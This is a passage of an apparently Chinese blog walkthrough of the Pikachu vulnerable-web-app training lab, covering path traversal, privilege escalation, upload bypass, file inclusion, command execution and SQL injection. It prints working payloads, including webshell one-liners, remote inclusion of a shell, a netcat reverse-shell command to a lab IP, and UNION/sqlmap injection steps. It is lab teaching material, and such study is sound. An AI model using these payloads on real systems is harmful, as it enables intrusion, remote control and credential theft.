href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多）</p><p>你可以通过“..&#x2F;..&#x2F;”对应的测试栏目，来进一步的了解该漏洞。</p><p><img src="/../image/image-20240709103441402-1723344400329-59.png" alt="image-20240709103441402"></p><p>随便点击页面中的两个连接，发现传递的参数是一个文件，可以试试能不能进行目录遍历</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=../../../../../../../etc/passwd #几个..没关系，数量够多就都是从根目录开始访问</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240709103626405-1723344400329-62.png" alt="image-20240709103626405"></p><p>看下代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SELF_PAGE</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>],<span class="string">&#x27;/&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="variable">$PIKA_ROOT_DIR</span> =  <span class="string">&quot;../../&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="variable">$PIKA_ROOT_DIR</span> . <span class="string">&#x27;header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">    <span class="comment">//这里直接把传进来的内容进行了require(),造成问题</span></span><br><span class="line">    <span class="keyword">require</span> <span class="string">&quot;soup/<span class="subst">$filename</span>&quot;</span>;</span><br><span class="line"><span class="comment">//    echo $html;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>include和require:<a href="https://www.runoob.com/php/php-includes.html">https://www.runoob.com/php/php-includes.html</a></p><p>require会把传进来的文件和soup进行拼接，访问，所以我们可以通过目录遍历的方式访问到相应的文件</p><h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p><p>因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p><p>你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。</p><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p><img src="/../image/image-20240709104124826-1723344400329-63.png" alt="image-20240709104124826"></p><p>先随便登陆一个用户，查看个人信息</p><p><img src="/../image/image-20240709104250186-1723344400329-67.png" alt="image-20240709104250186"></p><p>尝试修改username，看下能否访问到其它用户的信息</p><p><img src="/../image/image-20240709104334389-1723344400329-64.png" alt="image-20240709104334389"></p><p>可以看到我们修改后不用登陆就可以看到kobe的信息了</p><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>第一步：打开pikachu的垂直越权<br>点开提示，发现有一个高权限用户admin和低权限用户pikachu</p><p><img src="/../image/image-20240719103016858-1723344400329-65.png" alt="image-20240719103016858"></p><p>第二步：分别登录上两个不同账户进行查看，发现admin有添加用户的权限，而pikachu只有查看用户的权限</p><p><img src="/../image/image-20240719103102289-1723344400329-68.png" alt="image-20240719103102289"></p><p><img src="/../image/image-20240719103126762-1723344400329-66.png" alt="image-20240719103126762"></p><p>第三步：垂直越权测试（使用pikachu的身份去添加用户）<br>首先，先登录行admin账号，添加账户，然后把添加账户的数据包拦截导入 Repeater （重放器）模块</p><p><img src="/../image/image-20240719103556348-1723344400329-69.png" alt="image-20240719103556348"></p><p><img src="/../image/image-20240719103941444-1723344400329-71.png" alt="image-20240719103941444"></p><p>此时把当前拦截的数据包丢弃，admin账户退出登录</p><p><img src="/../image/image-20240719104041195-1723344400329-70.png" alt="image-20240719104041195"></p><p>第四步：在admin账户退出登录的情况下，重新发送创建账户的数据包</p><p><img src="/../image/image-20240719104134926-1723344400329-72.png" alt="image-20240719104134926"></p><p>然后用pikachu普通用户身份登录查看账户是否创建成功</p><p><img src="/../image/image-20240719104205661-1723344400330-73.png" alt="image-20240719104205661"></p><p>发现并没有刚刚创建的账户二狗<br>原因：创建二狗用户的时候admin账户已退出登录<br>第五步：使用pikachu的身份创建二狗账户<br>查看数据包中最后一个数据包就是刚刚pikachu登录的数据包</p><p><img src="/../image/image-20240719104404330-1723344400330-76.png" alt="image-20240719104404330"></p><p>复制其中的cookie替换repeater中的cookie</p><p><img src="/../image/image-20240719104511119-1723344400330-75.png" alt="image-20240719104511119"></p><p>发送，再回到页面查看</p><p><img src="/../image/image-20240719104540254-1723344400330-78.png" alt="image-20240719104540254"></p><p>成功添加zs用户</p><h1 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a><strong>不安全的文件上传</strong></h1><p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705">https://blog.csdn.net/qq_43390703/article/details/104858705</a></p><p>因为业务功能需要,很多web站点都有文件上传的接口,比如:<br>1.注册时上传头像图片(比如jpg.png,gif等) ;<br>2.上传文件附件( doc,xIs等) ;<br>而在后台开发时并没有对上传的文件功能进行安全考虑或者采用了有缺陷的措施，导致攻击者可以通过一些手段绕过安全措施从而上传一些恶意文件(如:一句话木马)从而通过对该恶意文件的访问来控制整个web后台。</p><p>文件上传漏洞测试流程：<br>1，对文件上传的地方按照要求上传文件，查看返回结果(路径，提示等);<br>2 ，尝试上传不同类型的“恶意”文件，比如xx.php文件,分析结果;<br>3，查看html源码，看是否通过js在前端做了上传限制，可以绕过;<br>4 ，尝试使用不同方式进行绕过:黑白名单绕过&#x2F;MIME类型绕过&#x2F;目录0x00截断绕过等;<br>5，猜测或者结合其他漏洞(比如敏感信息泄露等)得到木马路径,连接测试。</p><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p><img src="/../image/image-20240709133758141-1723344400330-74.png" alt="image-20240709133758141"></p><p>发现有过滤、查看源码</p><p><img src="/../image/image-20240709133839677-1723344400330-77.png" alt="image-20240709133839677"></p><p>发现只允许上环这三类文件，但过滤是在前端，所以我们可以抓包修改后缀，准备好测试文件my.jpg</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Success&lt;h1&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240709134314179-1723344400330-80.png" alt="image-20240709134314179"></p><p><img src="/../image/image-20240709134349408-1723344400330-82.png" alt="image-20240709134349408"></p><p>可以看到文件上传成功，访问看下是否被解析</p><p><img src="/../image/image-20240709134704717-1723344400330-79.png" alt="image-20240709134704717"></p><p>也可以用一句话木马来获得shell，直接修改刚刚的数据</p><p><img src="/../image/image-20240709135552001-1723344400330-81.png" alt="image-20240709135552001"></p><p><img src="/../image/image-20240709135654692-1723344400330-84.png" alt="image-20240709135654692"></p><h2 id="MIMEtype"><a href="#MIMEtype" class="headerlink" title="MIMEtype"></a>MIMEtype</h2><p>这一关我们首先要知道MIME是什么</p><p><a href="https://www.runoob.com/http/mime-types.html">https://www.runoob.com/http/mime-types.html</a></p><h3 id="常见的-MIME-类型"><a href="#常见的-MIME-类型" class="headerlink" title="常见的 MIME 类型"></a>常见的 MIME 类型</h3><ul><li>超文本标记语言文本 <strong>.html、.html</strong>：<strong>text&#x2F;html</strong></li><li>普通文本 <strong>.txt</strong>： <strong>text&#x2F;plain</strong></li><li>RTF 文本 <strong>.rtf</strong>： <strong>application&#x2F;rtf</strong></li><li>GIF 图形 <strong>.gif</strong>： <strong>image&#x2F;gif</strong></li><li>JPEG 图形 <strong>.jpeg、.jpg</strong>： <strong>image&#x2F;jpeg</strong></li></ul><p>同样的方法，我们先上传文件，抓包，跳过前端过滤</p><p><img src="/../image/image-20240709140138780-1723344400330-85.png" alt="image-20240709140138780"></p><p>这是jpeg的MIEME，我们可以试着不修改这个，只修改后缀上传一下看会发生什么</p><p><img src="/../image/image-20240709140737222-1723344400330-83.png" alt="image-20240709140737222"></p><p><img src="/../image/image-20240709140724024-1723344400330-86.png" alt="image-20240709140724024"></p><p>发现还是可以上传成功的，我们试试直接上传php文件，不修改后缀</p><p><img src="/../image/image-20240709140912331-1723344400330-87.png" alt="image-20240709140912331"></p><p>发现返回了octet-stream,我们尝试修改这个为刚刚的jpg</p><p><img src="/../image/image-20240709141002626-1723344400330-89.png" alt="image-20240709141002626"></p><p>发现上传成功</p><p><img src="/../image/image-20240709141026972-1723344400330-90.png" alt="image-20240709141026972"></p><p>同样是会被解析的，shell我就不试了，一样的方法</p><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2><p>按照前面的流程走了一下</p><p><img src="/../image/image-20240709150847618-1723344400330-88.png" alt="image-20240709150847618"></p><p>加个文件头试试</p><p><img src="/../image/image-20240709152434708-1723344400330-91.png" alt="image-20240709152434708"></p><p>还是不行，估计后端还有过滤，可以试试图片马，分析一下，getimagesize</p><p>Getimagesize ( )返回结果中有文件大小和文件类型,如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。<br>是否可以绕过呢?可以，因为图片头可以被伪造。<br>图片木马的制作:<br>方法1 :直接伪造头部GIF89A<br>方法2.CMD: copy &#x2F;b test.png + muma.php ccc.png<br>方法3.使用GIMP (开源的图片修改软件) , 通过增加备注,写入执行命令</p><p>法一：可以发现路径都变复杂了，访问一下试试</p><p><img src="/../image/image-20240709152644856-1723344400330-95.png" alt="image-20240709152644856"></p><p>但访问该页面，phpinfo()没有被执行，所以还需要利用到文件包含漏洞，修改路径</p><p><img src="/../image/image-20240709153102562-1723344400330-92.png" alt="image-20240709153102562"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.142:8080/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2024/07/09/631387668ce6236f935032106790.jpg&amp;submit=%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240709155835360-1723344400330-93.png" alt="image-20240709155835360"></p><h1 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a><strong>不安全的文件下载</strong></h1><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。</p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p><p>进入页面</p><p><img src="/../image/image-20240709160524010-1723344400330-94.png" alt="image-20240709160524010"></p><p>点击头像下载文件，试一试</p><p><img src="/../image/image-20240709163016390-1723344400330-97.png" alt="image-20240709163016390"></p><p>抓下下载包</p><p><img src="/../image/image-20240709163101047-1723344400330-98.png" alt="image-20240709163101047"></p><p>发现下载连接，我们可以通过修改filename来下载其它文件</p><p><img src="/../image/image-20240709163207303-1723344400330-96.png" alt="image-20240709163207303"></p><p><img src="/../image/image-20240709163242802-1723344400330-102.png" alt="image-20240709163242802"></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><a href="https://www.freebuf.com/articles/web/367359.html">https://www.freebuf.com/articles/web/367359.html</a></p><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。 比如 在PHP中，提供了：<br>include(),include_once()<br>require(),require_once()<br>这些文件包含函数，这些函数在代码设计中被经常使用到。</p><p>大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。 但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。 攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。 根据不同的配置环境，文件包含漏洞分为如下两种情况：<br><strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些 固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br><strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。</p><p>因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。</p><h2 id="local"><a href="#local" class="headerlink" title="local"></a>local</h2><p><img src="/../image/image-20240709163736181-1723344400330-99.png" alt="image-20240709163736181"></p><p>随便提交一个内容，发现返回了文件名，可以通过修改filename参数，访问敏感文件</p><p><img src="/../image/image-20240709163829452-1723344400330-101.png" alt="image-20240709163829452"></p><h2 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h2><p>和上一关不同的是，这一关可以进行远程访问，我们可以通过这个访问百度</p><p><img src="/../image/image-20240709171034164-1723344400331-103.png" alt="image-20240709171034164"></p><p>也就意味着可能通过这个下载自己上传到服务器的木马，我们可以看下这两个的源码有什么区别</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">local:</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;<span class="comment">//变量传进来直接包含,没做任何的安全限制</span></span><br><span class="line"><span class="comment">//     //安全的写法,使用白名单，严格指定包含的文件名</span></span><br><span class="line"><span class="comment">//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;)&#123;</span></span><br><span class="line"><span class="comment">//         include &quot;include/$filename&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">&#125;</span><br><span class="line">remote:</span><br><span class="line"><span class="comment">//远程文件包含漏洞,需要php.ini的配置文件符合相关的配置</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;<span class="subst">$filename</span>&quot;</span>;<span class="comment">//变量传进来直接包含,没做任何的安全限制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以啊看到本地的他多了个文件显示，而远程的他是把你的参数直接包含过来，没有其它的内容</p><h3 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h3><p>首先访问网页:<a href="http://192.168.174.160/pikachu/vul/fileinclude/fi_remote.php">http://192.168.174.160/pikachu/vul/fileinclude/fi_remote.php</a></p><p><img src="/../image/image-20240731162634753-1723344400330-100.png" alt="image-20240731162634753"></p><p>出现这个问题，你就去小皮文件里的php里找到对应版本的php.ini</p><p><img src="/../image/image-20240731162728725-1723344400331-104.png" alt="image-20240731162728725"></p><p>然后重启服务</p><p><img src="/../image/image-20240731162801467-1723344400331-106.png" alt="image-20240731162801467"></p><p>随便提交一个查询</p><p><img src="/../image/image-20240731162825791-1723344400331-105.png" alt="image-20240731162825791"></p><p>可以看到存在文件包含漏洞，看下能不能包含baidu</p><p><img src="/../image/image-20240731162931757-1723344400331-107.png" alt="image-20240731162931757"></p><p>成功包含，下面用python起一个服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 9966</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240731163104569-1723344400331-108.png" alt="image-20240731163104569"></p><p><img src="/../image/image-20240731163117363-1723344400331-110.png" alt="image-20240731163117363"></p><p>在这里启动服务器，然后访问</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.160:9966</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240731163200894-1723344400331-111.png" alt="image-20240731163200894"></p><p>然后将前面包含百度的连接改为我们服务器的连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.160/pikachu/vul/fileinclude/fi_remote.php?filename=http://192.168.174.160:9966/shell.php&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240731163304896-1723344400331-109.png" alt="image-20240731163304896"></p><p>文件包含这个连接，事没有下载的，只是包含在也面里，所以我们需要利用php的fputs函数创建文件，并写入shell，所以说自己写一个马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">                                                            <span class="meta">?&gt;</span><span class="string">&#x27;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240731164124749-1723344400331-114.png" alt="image-20240731164124749"></p><p>然后去包含这个连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.174.160/pikachu/vul/fileinclude/fi_remote.php?filename=http://192.168.174.160:9966/myshell.txt&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240731164226798-1723344400331-115.png" alt="image-20240731164226798"></p><p>发现成功上传了，路径就是fileinclude那个目录，接下来用蚁剑或冰蝎都可以连</p><p><img src="/../image/image-20240731164717640-1723344400331-116.png" alt="image-20240731164717640"></p><h1 id="RCE-remote-command-x2F-code-execute"><a href="#RCE-remote-command-x2F-code-execute" class="headerlink" title="RCE(remote command&#x2F;code execute)"></a>RCE(remote command&#x2F;code execute)</h1><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p><p><strong>远程系统命令执行</strong><br>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上<br>一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器</p><p>现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。 在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-</p><p><strong>远程代码执行</strong><br>同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。</p><p>因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p><p><strong>管道符号和通用命令符</strong></p><p>LInux：</p><p>;前面的执行完执行后面的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 1;echo 2;echo 3</span><br></pre></td></tr></table></figure><p>|是管道符，显示后面的执行结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch 1.txt | cat 1.txt | echo 1</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241108163648878.png" alt="image-20241108163648878"></p><p>||当前面的执行出错时执行后面的，否则不执行后面的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 1 || echo 2 </span><br><span class="line">cd c || echo 1</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241108163825492.png" alt="image-20241108163825492"></p><p>Windows</p><p>&amp;前面的语句为假则直接执行后面的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 1234.1 &amp; whoami </span><br></pre></td></tr></table></figure><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 1234.1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure><p>|直接执行后面的语句</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 1 | whoami </span><br></pre></td></tr></table></figure><p>||前面出错执行后面的，否则只执行前面的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 124.1 || whoami // username</span><br><span class="line">echo 1 || whoami // 1</span><br></pre></td></tr></table></figure><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p><img src="/../image/image-20240710120424514-1723344400331-112.png" alt="image-20240710120424514"></p><p>ping一下本地地址，通过或来执行别的命令</p><p><img src="/../image/image-20240710121302243-1723344400331-113.png" alt="image-20240710121302243"></p><p>可以看到是windows的目录，我们上传一下nc,用来反弹shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m http.server <span class="number">9966</span></span><br><span class="line">curl -o nc.exe http:ip:port/nc64.exe</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240710131315451-1723344400331-117.png" alt="image-20240710131315451"></p><p>在攻击机监听</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 6666</span><br></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc64.exe -e cmd 192.168.174.142 6666</span><br></pre></td></tr></table></figure><p>成功反弹</p><p><img src="/../image/image-20240710132234921-1723344400331-119.png" alt="image-20240710132234921"></p><h2 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h2><p>动态执行代码：eval() 函数使程序能够在运行时动态执行字符串中的代码。它可以将字符串中的代码作为有效的程序代码进行解析和执行。</p><p>字符串转换为代码：eval() 函数将接收到的字符串参数解析为编程语言的有效代码，并尝试执行该代码。这意味着您可以在字符串中包含变量、表达式、函数调用等，并且它们将在执行时被解释和计算。<br>直接执行phpinfo();即可</p><p><img src="/../image/image-20240710133200319-1723344400331-118.png" alt="image-20240710133200319"></p><p><img src="/../image/image-20240710133206389-1723344400331-120.png" alt="image-20240710133206389"></p><p>再php下，允许命令执行的常见函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval() assert() preg_replace() call_user_func() $a($b)</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20241108164304258.png" alt="image-20241108164304258"></p><p><img src="/../image/image-20241108164323565.png" alt="image-20241108164323565"></p><p>pattern:要搜索的模式，可以是一个字符串或字符串数组。当pattern出存在一个“&#x2F;e”修饰符时，$replacement的值会被当成php代码来执行。</p><p><img src="/../image/image-20241108164416174.png" alt="image-20241108164416174"></p><p><img src="/../image/image-20241108164444093.png" alt="image-20241108164444093"></p><p>常用利用方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=@eval($_POST[666]);一句话木马</span><br><span class="line">?a=print(__FILE__);获取当前绝对路径</span><br><span class="line">?a=var_dump(file_get_contents(&#x27;C:\Windows\System32\drivers\etc\hosts&#x27;));</span><br><span class="line">?a=var_dump(file_put_contents($_POST[1],$_POST[2]));</span><br><span class="line">1=shell.php&amp;2=&lt;?php phpinfo() ?&gt;写shell</span><br></pre></td></tr></table></figure><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p><p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p><h2 id="数字型注入post"><a href="#数字型注入post" class="headerlink" title="数字型注入post"></a>数字型注入post</h2><p><img src="/../image/image-20240710135652088-1723344400331-122.png" alt="image-20240710135652088"></p><p>简单提交下，有回显，但post表单数据不在url显示，我们抓包下来测试</p><p><img src="/../image/image-20240710135828045-1723344400331-121.png" alt="image-20240710135828045"></p><p>数字型注入,找一下有几个字段</p><p><img src="/../image/image-20240710135947104-1723344400331-123.png" alt="image-20240710135947104"></p><p><img src="/../image/image-20240710135958024-1723344400331-124.png" alt="image-20240710135958024"></p><p>说明有2个字段,测试下回显位置</p><p><img src="/../image/image-20240710140132081-1723344400331-125.png" alt="image-20240710140132081"></p><p>下面就是查库、表、列名了，这里用联合查询注入的方法</p><p><img src="/../image/image-20240710140230275-1723344400331-126.png" alt="image-20240710140230275"></p><p>表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,table_name from information_schema.tables where table_schema=&quot;pikachu&quot; </span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240710140347892-1723344400331-127.png" alt="image-20240710140347892"></p><p>列</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,column_name from information_schema.columns where table_schema=&quot;pikachu&quot; and table_name=&quot;users&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240710140437543-1723344400331-128.png" alt="image-20240710140437543"></p><p>有了字段名，下面就可以查询用户名和密码了</p><p><img src="/../image/image-20240710140525618-1723344400331-129.png" alt="image-20240710140525618"></p><p>密码可以拿去cmd5网站去跑一跑</p><p>也可以用sqlmap来跑,先把抓到的包保存1.txt</p><p>sqlmap教程<a href="https://blog.csdn.net/dzqxwzoe/article/details/132683722">https://blog.csdn.net/dzqxwzoe/article/details/132683722</a></p><p><img src="/../image/image-20240710215454283-1723344400331-130.png" alt="image-20240710215454283"></p><p>然后用sqlmap去判断有没有注入点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r 1.txt </span><br><span class="line">如果不是post方法，可以直接-u &quot;url&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240710215918864-1723344400331-131.png" alt="image-20240710215918864"></p><p>中间弹出的信息，可以稍微看一下，根据需要选择，有些不想询问的可以加上–batch参数</p><p><img src="/../image/image-20240710220131281-1723344400331-133.png" alt="image-20240710220131281"></p><p>这里弹出的level是指需要执行的测试等级，一共有5个等级（1-5） 不加 level 时，默认是1</p><p>5级包含的payload最多，会自动破解出cookie、XFF等头部注入，相对应他的速度也比较慢，这里我们也是默认即可</p><p><img src="/../image/image-20240710220326703-1723344400331-134.png" alt="image-20240710220326703"></p><p>这里提示检测到参数可能存在攻击，是否跳过其它参数的检测，这里我们就跳过</p><p><img src="/../image/image-20240710220503753-1723344400331-135.png" alt="image-20240710220503753"></p><p>这里只执行基本UNION测试。您想要减少请求的数量吗?我们选择yes</p><p><img src="/../image/image-20240710220741144-1723344400331-132.png" alt="image-20240710220741144"></p><p>最终也是测试出来存在这些注入，然后我们可以进一步去测试了</p><p>获取库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap -u &quot;url&quot; --dbs / -r 1.txt --dbs</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240710221945660-1723344400331-136.png" 